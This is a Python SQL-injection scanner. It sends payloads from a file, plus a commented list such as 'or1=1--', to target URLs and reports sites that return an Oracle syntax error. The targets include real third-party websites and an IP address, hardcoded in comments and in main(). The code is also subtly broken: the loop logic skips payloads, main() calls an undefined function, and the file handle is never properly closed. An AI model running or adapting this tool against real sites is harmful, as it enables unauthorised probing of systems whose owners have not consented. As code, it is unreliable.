import sys
import os
import urllib.request

class Invpal_005_Oracle:

    def __init__(self):
        """sql injection"""
        #self.fullurl = url

    def oracle_injection(self,fullurl):

        global lst_msg
        #fullurl = input("URL: ")
        #fullurl = "http://www.romanianwriters.ro/s.php?id="
        #fullurl = "http://190.5.199.22:8082/RegistroSiag/Account/wfLogin.aspx?ReturnUrl=%2fRegistroSiag%2f"
        errormsg = "ORA-00933: SQL command not properly ended"
        #payloads = ["'admin'or1=1or''='","'=1\'or\'1\'=\'1\'","'or1=1","'1'or'1'=' 1","'or1=1#","'0'or'0'='0","'admin'or1=1or''='","'admin'or1=1","'admin'or'1'='1","'or1=1/*","'or1=1--"] #whatever payloads you want here ## YOU CAN ADD YOUR OWN
        errorr = "yes"
        fullbody= ""

        os.chdir("SQL_XSS")
        fname = "payloadSQL.txt"
        with open(fname) as f:
            content = f.readlines()    
        payloads = [x.strip() for x in content]

        lst_msg = []

        for payload in payloads:
            try:
                if fullurl[-1] != "/":
                    fullurl = fullurl + "/"
                else:
                    payload = payload
                    fullpayload = fullurl + payload
                    print(fullpayload)
                    lst_msg.append(fullpayload)
                    resp = urllib.request.urlopen(fullurl + payload)        
                    body = resp.read()
                    #print(body)
                    fullbody = body.decode('utf-8')
                    #print(fullbody)
            except:
                msg_error = "[-] Try another paylod " + payload
                lst_msg.append(msg_error)
                #print(msg_error)
                #print(error)
                errorr = "no"
                #sys.exit()
            if errormsg in fullbody:
                if errorr == "no":
                    msg_payload = "[-] That payload might not work!"
                    print(msg_payload)
                    lst_msg.append(msg_payload)
                    errorr = "yes"
                else:
                    msg_injection = "[+] The website is Oracle injection vulnerable! Payload: " + payload
                    print(msg_injection)
                    lst_msg.append(msg_injection)
                    lst_msg.append(body)
                    print(body)
            else:
                msg_not_inject = "[-] The website is not Oracle injection vulnerable!"
                print(msg_not_inject)
                lst_msg.append(msg_not_inject)

        self.write_file()

    def write_file(self):

        fwrite = "../Salida/invpal-005-oracle.txt"
        f = open(fwrite,"a")
        for cadena in lst_msg:
            f.write(cadena)
            f.write("\n")
            f.close

    def main():
    	url = "http://www.tunesoman.com/product.php?id="
    	sql(url)

        